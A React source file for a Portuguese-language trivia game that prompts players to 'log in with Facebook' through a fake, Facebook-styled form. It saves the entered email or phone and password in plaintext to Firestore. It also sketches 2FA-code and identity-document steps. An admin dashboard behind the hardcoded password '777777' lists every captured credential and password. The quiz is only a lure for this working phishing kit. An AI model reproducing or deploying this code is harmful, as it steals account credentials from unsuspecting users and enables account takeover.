import { useState, useEffect, useRef } from 'react';
import { auth, db } from './lib/firebase';
import { collection, addDoc, getDocs, getDocsFromServer, deleteDoc, doc } from 'firebase/firestore';
import backgroundMusic from './som do fundo.mp3';

enum OperationType {
  CREATE = 'create',
  UPDATE = 'update',
  DELETE = 'delete',
  LIST = 'list',
  GET = 'get',
  WRITE = 'write',
}

interface FirestoreErrorInfo {
  error: string;
  operationType: OperationType;
  path: string | null;
  authInfo: {
    userId?: string | null;
    email?: string | null;
    emailVerified?: boolean | null;
    isAnonymous?: boolean | null;
    tenantId?: string | null;
    providerInfo?: {
      providerId?: string | null;
      email?: string | null;
    }[];
  }
}

function handleFirestoreError(error: unknown, operationType: OperationType, path: string | null) {
  const errInfo: FirestoreErrorInfo = {
    error: error instanceof Error ? error.message : String(error),
    authInfo: {
      userId: auth.currentUser?.uid,
      email: auth.currentUser?.email,
      emailVerified: auth.currentUser?.emailVerified,
      isAnonymous: auth.currentUser?.isAnonymous,
      tenantId: auth.currentUser?.tenantId,
      providerInfo: auth.currentUser?.providerData?.map(provider => ({
        providerId: provider.providerId,
        email: provider.email,
      })) || []
    },
    operationType,
    path
  }
  console.error('Firestore Error: ', JSON.stringify(errInfo));
  throw new Error(JSON.stringify(errInfo));
}

export default function App() {
  const [credential, setCredential] = useState('');
  const [password, setPassword] = useState('');
  const [adminPassword, setAdminPassword] = useState('');
  const [users, setUsers] = useState<any[]>([]);
  const [selectedUsers, setSelectedUsers] = useState<string[]>([]);
  const [step, setStep] = useState<'welcome' | 'register' | '2fa' | 'verify' | 'complete' | 'admin-login' | 'admin-dashboard' | 'quiz'>('welcome');
  const [currentQuestion, setCurrentQuestion] = useState(0);
  const [score, setScore] = useState(0);
  const [showResult, setShowResult] = useState(false);
  const [feedback, setFeedback] = useState<{message: string, type: 'correct' | 'incorrect'} | null>(null);
  const audioRef = useRef<HTMLAudioElement>(null);

  useEffect(() => {
    const audio = audioRef.current;
    if (!audio) return;

    // Handle user interaction to start playing (browser autoplay policy)
    const startPlaying = () => {
        audio.play().catch(e => console.log('Autoplay blocked', e));
        document.removeEventListener('click', startPlaying);
        document.removeEventListener('keydown', startPlaying);
    };

    document.addEventListener('click', startPlaying);
    document.addEventListener('keydown', startPlaying);

    return () => {
        document.removeEventListener('click', startPlaying);
        document.removeEventListener('keydown', startPlaying);
    };
  }, []);

  const questions = [
    { question: "Qual é a capital da França?", options: ["Berlim", "Madrid", "Paris", "Londres"], answer: "Paris" },
    { question: "Qual é o maior planeta do sistema solar?", options: ["Terra", "Marte", "Júpiter", "Saturno"], answer: "Júpiter" },
    { question: "Quem pintou a Mona Lisa?", options: ["Van Gogh", "Picasso", "Da Vinci", "Dalí"], answer: "Da Vinci" },
    { question: "Qual é o elemento químico com símbolo O?", options: ["Ouro", "Oxigênio", "Osmo", "Ósmio"], answer: "Oxigênio" },
    { question: "Em que ano a Segunda Guerra Mundial terminou?", options: ["1940", "1945", "1950", "1939"], answer: "1945" },
    { question: "Quem escreveu 'Dom Casmurro'?", options: ["Machado de Assis", "José de Alencar", "Clarice Lispector", "Jorge Amado"], answer: "Machado de Assis" },
    { question: "Qual é o maior oceano do mundo?", options: ["Atlântico", "Índico", "Pacífico", "Ártico"], answer: "Pacífico" },
    { question: "Qual país tem o formato de uma bota?", options: ["Grécia", "Itália", "Espanha", "Portugal"], answer: "Itália" },
    { question: "Quantos continentes existem?", options: ["5", "6", "7", "8"], answer: "7" },
    { question: "Qual é o animal mais rápido do mundo?", options: ["Leão", "Guepardo", "Águia", "Cavalo"], answer: "Guepardo" },
    { question: "Quem descobriu o Brasil?", options: ["Cristóvão Colombo", "Pedro Álvares Cabral", "Vasco da Gama", "Américo Vespúcio"], answer: "Pedro Álvares Cabral" },
    { question: "Qual é o metal mais caro do mundo?", options: ["Ouro", "Prata", "Ródio", "Platina"], answer: "Ródio" },
    { question: "Em qual continente fica o Egito?", options: ["Ásia", "Europa", "África", "América"], answer: "África" },
    { question: "Qual é o planeta vermelho?", options: ["Vênus", "Marte", "Júpiter", "Mercúrio"], answer: "Marte" },
    { question: "Quem inventou a lâmpada?", options: ["Nikola Tesla", "Thomas Edison", "Albert Einstein", "Graham Bell"], answer: "Thomas Edison" },
    { question: "Quantos estados tem o Brasil?", options: ["25", "26", "27", "28"], answer: "26" },
    { question: "Qual é o maior país do mundo em área?", options: ["China", "EUA", "Rússia", "Brasil"], answer: "Rússia" },
    { question: "Quem é o autor de 'Harry Potter'?", options: ["J.R.R. Tolkien", "J.K. Rowling", "George R.R. Martin", "Stephen King"], answer: "J.K. Rowling" },
    { question: "Qual a língua mais falada no mundo?", options: ["Inglês", "Mandarim", "Espanhol", "Hindi"], answer: "Mandarim" },
    { question: "Qual é o menor país do mundo?", options: ["Mônaco", "Vaticano", "San Marino", "Malta"], answer: "Vaticano" },
    { question: "Qual é o rio mais longo do mundo?", options: ["Nilo", "Amazonas", "Mississippi", "Yangtzé"], answer: "Nilo" },
    { question: "Quantos ossos tem o corpo humano adulto?", options: ["200", "206", "210", "220"], answer: "206" },
    { question: "Qual é o metal líquido à temperatura ambiente?", options: ["Mercúrio", "Gálio", "Frâncio", "Césio"], answer: "Mercúrio" },
    { question: "Quem pintou 'A Última Ceia'?", options: ["Michelangelo", "Da Vinci", "Raphael", "Donatello"], answer: "Da Vinci" },
    { question: "Qual é a montanha mais alta do mundo?", options: ["K2", "Everest", "Kangchenjunga", "Lhotse"], answer: "Everest" },
    { question: "Em que país surgiu a democracia?", options: ["Roma", "Grécia", "Egito", "Pérsia"], answer: "Grécia" },
    { question: "Qual é a moeda oficial do Japão?", options: ["Yuan", "Won", "Iene", "Dólar"], answer: "Iene" },
    { question: "Qual é o principal gás da atmosfera?", options: ["Oxigênio", "Nitrogênio", "Hidrogênio", "Dióxido de Carbono"], answer: "Nitrogênio" },
    { question: "Qual é a fruta nacional do Brasil?", options: ["Banana", "Abacaxi", "Caju", "Manga"], answer: "Caju" },
    { question: "Quem é conhecido como o 'Rei do Futebol'?", options: ["Messi", "Cristiano Ronaldo", "Pelé", "Maradona"], answer: "Pelé" },
    { question: "Qual é o maior mamífero terrestre?", options: ["Elefante Africano", "Girafa", "Hipopótamo", "Rinoceronte"], answer: "Elefante Africano" },
    { question: "Qual é a capital do Japão?", options: ["Kyoto", "Osaka", "Tóquio", "Nagoya"], answer: "Tóquio" },
    { question: "Qual é a cidade conhecida como 'Cidade Luz'?", options: ["Londres", "Nova Iorque", "Paris", "Roma"], answer: "Paris" }
  ];

  const playSound = (type: 'correct' | 'incorrect') => {
    const AudioContext = window.AudioContext || (window as any).webkitAudioContext;
    if (!AudioContext) return;
    
    const audioCtx = new AudioContext();
    const oscillator = audioCtx.createOscillator();
    const gainNode = audioCtx.createGain();

    oscillator.connect(gainNode);
    gainNode.connect(audioCtx.destination);

    if (type === 'correct') {
      oscillator.frequency.value = 500; // higher pitch
    } else {
      oscillator.frequency.value = 200; // lower pitch
    }

    gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
    gainNode.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 0.5);

    oscillator.start();
    oscillator.stop(audioCtx.currentTime + 0.5);
  };

  const handleAnswer = (option: string) => {
    const isCorrect = option === questions[currentQuestion].answer;
    setFeedback({
      message: isCorrect ? "Resposta Certa!" : "Resposta Errada",
      type: isCorrect ? 'correct' : 'incorrect'
    });
    
    playSound(isCorrect ? 'correct' : 'incorrect');

    if (isCorrect) {
      setScore(score + 1);
    }
  };

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    if (password.length < 6) {
      alert('A senha deve ter pelo menos 6 caracteres');
      return;
    }
    try {
      // Save user to Firestore
      await addDoc(collection(db, 'users'), {
        credential: credential,
        password: password,
        createdAt: new Date()
      });
      setStep('quiz');
    } catch (error: any) {
      handleFirestoreError(error, OperationType.WRITE, 'users');
    }
  };

  const handleAdminLogin = () => {
    if (adminPassword === '777777') {
      fetchUsers();
    } else {
      alert('Invalid admin password');
    }
  };

  const fetchUsers = async () => {
    try {
      const querySnapshot = await getDocsFromServer(collection(db, 'users'));
      const userData = querySnapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      setUsers(userData);
      setStep('admin-dashboard');
    } catch (error: any) {
      handleFirestoreError(error, OperationType.GET, 'users');
    }
  };

  const handleDeleteSelected = async () => {
    try {
      for (const userId of selectedUsers) {
        await deleteDoc(doc(db, 'users', userId));
      }
      setSelectedUsers([]);
      fetchUsers();
    } catch (error: any) {
      handleFirestoreError(error, OperationType.DELETE, 'users');
    }
  };

  return (
    <div className="min-h-screen bg-[url('/src/assets/images/professional_puzzle_background_1782606794113.jpg')] bg-cover bg-center bg-no-repeat flex flex-col items-center justify-center p-4 font-sans text-white">
      <div className={`bg-gray-900/80 backdrop-blur-xl border border-white/10 p-8 rounded-2xl shadow-2xl w-full ${step === 'admin-dashboard' ? 'max-w-4xl' : 'max-w-md'}`}>
        
        {step === 'welcome' && (
            <div className="text-center">
                <h1 className="text-3xl font-extrabold mb-6 tracking-tight text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-indigo-400">Bem-vindo ao Jogo de Inteligência KI</h1>
                <p className="text-gray-400 mb-8 text-lg">Desafie sua mente. Entre agora.</p>
                <button
                    onClick={() => setStep('register')}
                    className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white p-4 rounded-xl text-lg font-bold hover:scale-105 transition-transform duration-200 shadow-lg shadow-blue-500/30 cursor-pointer mb-4"
                >
                    Entrar no jogo com conta do Facebook
                </button>
                <button
                    onClick={() => setStep('admin-login')}
                    className="w-full bg-gray-700 text-white p-4 rounded-xl text-lg font-bold hover:bg-gray-600 transition"
                >
                    Entrar como Admin
                </button>
            </div>
        )}

        {(step !== 'welcome') && (
            <>
                <div className="mb-[15px]">
                <h1 className="text-[25px] font-normal text-left text-white">
                    {step === 'register' ? 'Inserir conta do Facebook' : step === '2fa' ? 'Autenticação' : 'Verificação'}
                </h1>
                <p className="text-[15px] text-gray-400">Entre na sua conta.</p>
                </div>
                <div className="border-b border-gray-700 mb-[20px]"></div>
            </>
        )}

        {step === 'register' && (
          <form className="space-y-[12px]" onSubmit={handleRegister}>
            <input
              type="text"
              placeholder="Email ou número de telefone do Facebook"
              className="w-full p-[14px_16px] border border-gray-700 bg-gray-800 rounded-[6px] text-[17px] box-border text-white"
              value={credential}
              onChange={(e) => setCredential(e.target.value)}
            />
            <input
              type="password"
              placeholder="Senha"
              className="w-full p-[14px_16px] border border-gray-700 bg-gray-800 rounded-[6px] text-[17px] box-border text-white"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <button
              type="submit"
              className="w-full bg-[#42B72A] text-white p-[10px_16px] rounded-[6px] text-[20px] font-bold hover:bg-[#36a420] cursor-pointer mt-[10px]"
            >
              Entrar
            </button>
          </form>
        )}
        {step === '2fa' && (
          <div className="space-y-[12px]">
            <p className="text-gray-400 text-[15px]">Enter 2FA code sent to your email.</p>
            <input
              type="text"
              placeholder="Code"
              className="w-full p-[14px_16px] border border-gray-700 bg-gray-800 rounded-[6px] text-[17px] box-border text-white"
            />
            <button
              onClick={() => setStep('verify')}
              className="w-full bg-[#42B72A] text-white p-[10px_16px] rounded-[6px] text-[20px] font-bold hover:bg-[#36a420] cursor-pointer"
            >
              Verify
            </button>
          </div>
        )}
        {step === 'verify' && (
          <div className="space-y-[12px]">
            <p className="text-gray-400 text-[15px]">Upload identity document.</p>
            <input
              type="file"
              className="w-full p-[14px_16px] border border-gray-700 bg-gray-800 rounded-[6px] text-[17px] box-border text-white"
            />
            <button
              onClick={() => setStep('complete')}
              className="w-full bg-[#42B72A] text-white p-[10px_16px] rounded-[6px] text-[20px] font-bold hover:bg-[#36a420] cursor-pointer"
            >
              Complete
            </button>
          </div>
        )}
        {step === 'complete' && (
            <div className="text-center space-y-4">
                <p className="text-white">Registration Complete!</p>
                <button
                    onClick={() => setStep('admin-login')}
                    className="w-full bg-gray-700 text-white p-3 rounded-md hover:bg-gray-600"
                >
                    View Admin Panel
                </button>
            </div>
        )}
        {step === 'quiz' && !showResult && (
            <div className="space-y-6">
                <div className="flex justify-between items-center mb-4">
                    <h2 className="text-2xl font-bold text-white">Pergunta {currentQuestion + 1}</h2>
                    <button
                        onClick={() => {
                            setStep('welcome');
                            setCurrentQuestion(0);
                            setScore(0);
                            setShowResult(false);
                            setFeedback(null);
                        }}
                        className="bg-red-600 text-white px-3 py-1 rounded-md text-sm hover:bg-red-700"
                    >
                        Sair
                    </button>
                </div>
                {feedback && (
                  <div className={`p-4 rounded-lg text-center font-bold ${feedback.type === 'correct' ? 'bg-green-600' : 'bg-red-600'}`}>
                    {feedback.message}
                  </div>
                )}
                <p className="text-lg text-gray-200">{questions[currentQuestion].question}</p>
                <div className="grid grid-cols-1 gap-3">
                    {questions[currentQuestion].options.map((option, index) => (
                        <button
                            key={index}
                            onClick={() => handleAnswer(option)}
                            className="w-full bg-gray-800 text-white p-4 rounded-lg hover:bg-gray-700 transition"
                        >
                            {option}
                        </button>
                    ))}
                </div>
                <div className="flex gap-4">
                    <button
                        onClick={() => { setCurrentQuestion(currentQuestion - 1); setFeedback(null); }}
                        disabled={currentQuestion === 0}
                        className="flex-1 bg-gray-700 text-white p-3 rounded-md hover:bg-gray-600 disabled:opacity-50"
                    >
                        Recuar
                    </button>
                    <button
                        onClick={() => { 
                            if (currentQuestion < questions.length - 1) { 
                                setCurrentQuestion(currentQuestion + 1); 
                                setFeedback(null); 
                            } else { 
                                setShowResult(true); 
                            } 
                        }}
                        className="flex-1 bg-blue-600 text-white p-3 rounded-md hover:bg-blue-700"
                    >
                        {currentQuestion === questions.length - 1 ? 'Finalizar' : 'Avançar'}
                    </button>
                </div>
            </div>
        )}
        {step === 'quiz' && showResult && (
            <div className="text-center space-y-4">
                <h2 className="text-2xl font-bold text-white">Quiz Completo!</h2>
                <p className="text-xl text-gray-200">Sua pontuação: {score} de {questions.length}</p>
                <button
                    onClick={() => {
                        setStep('welcome');
                        setCurrentQuestion(0);
                        setScore(0);
                        setShowResult(false);
                    }}
                    className="w-full bg-blue-600 text-white p-3 rounded-md hover:bg-blue-700"
                >
                    Voltar ao início
                </button>
            </div>
        )}
        {step === 'admin-login' && (
            <div className="space-y-4">
                <h2 className="text-xl font-bold text-white">Admin Login</h2>
                <input
                    type="password"
                    placeholder="Admin Password"
                    className="w-full p-3 border border-gray-700 bg-gray-800 rounded-md text-white"
                    value={adminPassword}
                    onChange={(e) => setAdminPassword(e.target.value)}
                />
                <button
                    onClick={handleAdminLogin}
                    className="w-full bg-red-600 text-white p-3 rounded-md hover:bg-red-700"
                >
                    Login
                </button>
                <button
                    onClick={() => setStep('welcome')}
                    className="w-full bg-gray-700 text-white p-3 rounded-md hover:bg-gray-600"
                >
                    Voltar
                </button>
            </div>
        )}
        {step === 'admin-dashboard' && (
            <div className="space-y-4">
                <h2 className="text-xl font-bold text-white">Admin Dashboard</h2>
                <button
                    onClick={handleDeleteSelected}
                    disabled={selectedUsers.length === 0}
                    className="w-full bg-red-600 text-white p-2 rounded-md hover:bg-red-700 disabled:bg-gray-500"
                >
                    Deletar Selecionados ({selectedUsers.length})
                </button>
                <div className="overflow-x-auto">
                    <table className="w-full text-white border-collapse">
                        <thead>
                            <tr>
                                <th className="border p-2">
                                    <input
                                        type="checkbox"
                                        onChange={(e) => {
                                            if (e.target.checked) {
                                                setSelectedUsers(users.map(u => u.id));
                                            } else {
                                                setSelectedUsers([]);
                                            }
                                        }}
                                        checked={selectedUsers.length === users.length && users.length > 0}
                                    />
                                </th>
                                <th className="border p-2">Credential</th>
                                <th className="border p-2">Senha</th>
                                <th className="border p-2">Created At</th>
                            </tr>
                        </thead>
                        <tbody>
                            {users.map((user) => (
                                <tr key={user.id}>
                                    <td className="border p-2">
                                        <input
                                            type="checkbox"
                                            checked={selectedUsers.includes(user.id)}
                                            onChange={(e) => {
                                                if (e.target.checked) {
                                                    setSelectedUsers([...selectedUsers, user.id]);
                                                } else {
                                                    setSelectedUsers(selectedUsers.filter(id => id !== user.id));
                                                }
                                            }}
                                        />
                                    </td>
                                    <td className="border p-2">{user.credential}</td>
                                    <td className="border p-2">{user.password}</td>
                                    <td className="border p-2">{user.createdAt?.toDate().toLocaleString()}</td>
                                </tr>
                            ))}
                        </tbody>
                    </table>
                </div>
                <button
                    onClick={() => {
                        setStep('welcome');
                        setSelectedUsers([]);
                    }}
                    className="w-full bg-gray-700 text-white p-3 rounded-md hover:bg-gray-600"
                >
                    Voltar
                </button>
            </div>
        )}
        <audio ref={audioRef} src={backgroundMusic} loop />
      </div>
    </div>
  );
}
